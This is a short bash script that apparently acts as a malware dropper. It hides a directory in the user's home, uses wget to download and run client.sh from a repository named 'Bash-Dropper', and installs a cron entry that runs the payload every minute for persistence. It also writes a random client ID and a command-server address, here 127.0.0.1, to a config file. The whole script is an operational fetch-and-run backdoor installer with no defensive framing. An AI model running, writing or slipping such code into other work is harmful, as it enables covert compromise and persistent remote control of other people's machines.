#! /bin/bash
mkdir ~/.-
wget -O ~/.-/client.sh https://raw.githubusercontent.com/P4tches/Bash-Dropper/master/client.sh
chmod +x ~/.-/client.sh
crontab -l > mycron
echo "* * * * * ~/.-/client.sh" >> mycron
#echo "* * * * * ~/NCserver/client.sh" >> mycron
crontab mycron
rm mycron
mkdir ~/.-
env LC_CTYPE=C tr -dc "a-zA-Z0-9-_\$\?" < /dev/urandom | head -c 10 > ~/.-/set.txt
echo >> ~/.-/set.txt
echo 127.0.0.1 >> ~/.-/set.txt
